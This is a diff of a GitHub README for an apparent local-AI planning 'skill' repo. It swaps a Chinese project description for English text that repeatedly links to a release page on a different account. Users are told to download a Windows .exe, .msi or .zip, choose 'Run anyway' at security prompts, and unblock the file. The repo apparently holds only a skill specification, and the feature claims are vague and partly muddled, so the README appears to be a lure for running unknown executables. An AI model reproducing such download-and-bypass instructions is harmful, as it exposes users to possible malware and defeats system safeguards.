@@ -1,98 +1,239 @@
-# codex-skill-local-ai-systems-studio - 本地 AI 系统规划技能库 | Local AI Systems Studio Skill
+# 🧠 codex-skill-local-ai-systems-studio - Run Local AI with Clear Steps
 
-项目聚焦技能化方法沉淀，通过标准化模板帮助团队复用工作流与最佳实践。
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
 
-## 目录
+## 🚀 Getting Started
 
-- [1. 项目概述](#1-项目概述)
-- [2. 目标与场景](#2-目标与场景)
-- [3. 核心能力](#3-核心能力)
-- [4. 技术栈](#4-技术栈)
-- [5. 仓库结构](#5-仓库结构)
-- [6. Quick Start](#6-quick-start)
-- [7. 配置建议](#7-配置建议)
-- [8. 开发与测试](#8-开发与测试)
-- [9. 协作与发布](#9-协作与发布)
-- [10. 路线图](#10-路线图)
-- [11. 贡献指南](#11-贡献指南)
-- [12. License](#12-license)
+This README helps you get the app on Windows and run it with local AI tools like MLX, GGUF, Ollama, and LM Studio.
 
-## 1. 项目概述
+Use the release page to download and install the app:
 
-本仓库以工程化可维护为目标，强调文档清晰、结构稳定、可持续迭代。
+[Visit the release page to download](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
 
-## 2. 目标与场景
+## 📦 What This Project Does
 
-适用场景：
+This project helps you plan and deploy local LLM workflows. It is made for issue-to-plan work, so you can turn a task into a clear setup plan for local AI tools.
 
-- 作为业务功能开发与验证的基础仓库。
-- 作为团队内部协作与知识沉淀的载体。
-- 作为后续扩展和二次开发的起点。
+Use it to:
 
-## 3. 核心能力
+- Pick a local model setup
+- Compare MLX, GGUF, Ollama, and LM Studio
+- Organize a model plan before you deploy
+- Work from an issue or task list
+- Keep your local AI setup simple and repeatable
 
-- 提供技能说明、示例与参考资料。
-- 支持按场景快速复用与团队协作。
-- 支持持续迭代与标准化沉淀。
+## 💻 What You Need
 
-## 4. 技术栈
+Before you start, check that your Windows PC has:
 
-- Skill Specification
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 16 GB of RAM if you plan to use larger models
+- Enough free disk space for model files
+- A stable internet connection for the first download
+- Admin access if Windows asks for it
 
-## 5. 仓库结构
+If you use local models, more RAM and disk space can help. Smaller models work better on most home PCs.
 
-建议优先阅读：
+## ⬇️ Download and Install on Windows
 
-- README.md：项目入口与整体说明。
-- docs 或同类目录：架构、规范、部署与 FAQ。
-- 核心源码目录：按模块深入阅读。
+1. Open the release page:
+   [https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
 
-## 6. Quick Start
+2. Find the latest release at the top of the page.
 
-1. 克隆仓库并进入目录：
+3. Look under **Assets**.
 
-    git clone https://github.com/however-yir/codex-skill-local-ai-systems-studio.git
-    cd codex-skill-local-ai-systems-studio
+4. Download the Windows file that matches your system. It may be a `.exe`, `.zip`, or `.msi` file.
 
-2. 安装依赖并启动（按项目类型选择）：
+5. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
 
-请按仓库现有脚本执行安装与启动步骤。
+6. Open the extracted folder.
 
-3. 最小验证建议：
+7. Double-click the app file to run it.
 
-- 依赖安装成功。
-- 核心流程可运行。
-- 基础测试或检查通过。
+8. If Windows shows a security prompt, choose **Run anyway** if you trust the source and want to continue.
 
-## 7. 配置建议
+9. If the app asks for setup options, keep the default values for the first run.
 
-建议按 dev / staging / prod 分层配置，并将密钥类信息放入环境变量或密钥管理系统。
+## 🛠️ First Run Setup
 
-## 8. 开发与测试
+When you open the app for the first time, use these steps:
 
-推荐流程：
+1. Start the app from the downloaded file.
 
-1. 基于默认分支创建功能分支。
-2. 小步提交并保持提交目标单一。
-3. 本地完成构建与测试后再推送。
-4. 通过 Pull Request 完成评审与合并。
+2. Choose the local AI tool you want to use:
+   - **Ollama** for easy local model use
+   - **LM Studio** for a simple desktop workflow
+   - **GGUF** if you already have a compatible model file
+   - **MLX** if you use Apple-style model formats in a mixed setup
 
-## 9. 协作与发布
+3. Select a model that fits your PC. Small models load faster and use less memory.
 
-建议使用语义化版本，发布说明应包含新增、修复与兼容性说明。
+4. Point the app to your model folder if it asks for one.
 
-## 10. 路线图
+5. Save your settings.
 
-建议按以下顺序推进：
+6. Run a test task or open an example issue plan.
 
-1. 稳定主流程与关键接口。
-2. 优化模块边界与可观测性。
-3. 完善自动化测试与文档体系。
+## 🧭 How the Workflow Works
 
-## 11. 贡献指南
+This app uses a simple issue-to-plan flow:
 
-提交建议包含：变更背景、实现说明、验证结果、风险评估。
+1. You start with a task or issue.
+2. The app helps you break it into steps.
+3. You choose the local model path and tool.
+4. You review the plan.
+5. You use the plan to run your local AI setup.
 
-## 12. License
+This makes it easier to move from a rough idea to a working local deployment plan.
 
-请以仓库内现有 License 文件为准。
+## 🤖 Supported Local AI Paths
+
+### Ollama
+
+Use Ollama if you want a simple way to manage local models. It works well for users who want fewer manual steps.
+
+### LM Studio
+
+Use LM Studio if you want a desktop app for running models on your machine. It fits users who want a visual interface.
+
+### GGUF
+
+Use GGUF if you already have a model file in GGUF format. This format is common for local model use on Windows.
+
+### MLX
+
+Use MLX if you work with model setups that follow MLX-style deployment. It is useful in mixed local AI workflows.
+
+## 📁 Suggested Folder Setup
+
+Keep your files in one place so they are easy to find:
+
+- `Downloads` for the installer
+- `AI Models` for model files
+- `Projects` for task plans
+- `Logs` for notes and run history
+
+A simple folder layout helps you avoid confusion when you switch between tools or models.
+
+## 🔧 Basic Use Cases
+
+Use this app when you want to:
+
+- Plan a local LLM setup
+- Compare model options before you install
+- Turn an issue into a step list
+- Prepare a model deployment plan
+- Keep your local AI work in one place
+
+## 🧪 Choosing a Model
+
+Pick a model based on your system:
+
+- **Small model**: best for low-memory PCs
+- **Medium model**: good for daily work
+- **Large model**: needs more RAM and storage
+
+If the app gives you model choices, start small. You can move to a larger model after you confirm that the first setup works.
+
+## 🧰 Common Windows Checks
+
+If the app does not open, check these items:
+
+- The file finished downloading
+- You extracted the zip file
+- Windows did not block the file
+- You have enough disk space
+- Another security tool did not stop the app
+- You ran the right file for Windows
+
+If the app opens but does not load a model, check your model path and file type.
+
+## 📌 Tips for Smooth Setup
+
+- Keep the release page open while you install
+- Use one model tool at a time at first
+- Start with a small model
+- Save your settings after each change
+- Keep model files in a folder with a clear name
+- Use the same folder each time you run the app
+
+## 🧩 Example First Use Flow
+
+1. Download the latest release.
+2. Extract the files if needed.
+3. Open the app.
+4. Choose Ollama, LM Studio, GGUF, or MLX.
+5. Pick a small model.
+6. Save the setup.
+7. Run a test task.
+8. Review the plan the app creates.
+
+## 📚 Topic Areas
+
+This project covers:
+
+- agent skills
+- codex workflows
+- deployment planning
+- GGUF models
+- LM Studio setup
+- local LLM use
+- MLX workflows
+- model selection
+- Ollama setup
+
+## 🔍 File Types You May See
+
+You may download one of these:
+
+- `.exe` for direct run
+- `.msi` for Windows installer
+- `.zip` for manual extract and run
+
+If you are not sure which file to pick, choose the Windows installer or the main `.exe` file from the latest release.
+
+## 🧑‍💻 Who This Is For
+
+This app is for people who want to:
+
+- run local AI on a Windows PC
+- keep model setup simple
+- use a guided workflow
+- plan deployments without a lot of manual steps
+- work with local tools instead of cloud services
+
+## 📎 Download Again
+
+If you need the download page later, use this link:
+
+[https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
+
+## 🪟 Windows Run Steps
+
+1. Download the release file.
+2. Open the file location in File Explorer.
+3. Right-click the file if Windows blocks it.
+4. Choose **Properties** if you need to unblock it.
+5. Run the installer or app file.
+6. Follow the on-screen steps.
+7. Open the app from the Start menu or the folder where you installed it
+
+## 🧠 Model Planning Basics
+
+When you build a local AI setup, think about:
+
+- how much RAM you have
+- how large the model is
+- where the model file lives
+- which app will run the model
+- how you will test the result
+
+Good planning saves time and keeps your setup stable.
+
+## 🗂️ Project Name
+
+**codex-skill-local-ai-systems-studio**
+
+This repo helps with local AI planning and deployment across MLX, GGUF, Ollama, and LM Studio with issue-to-plan workflows
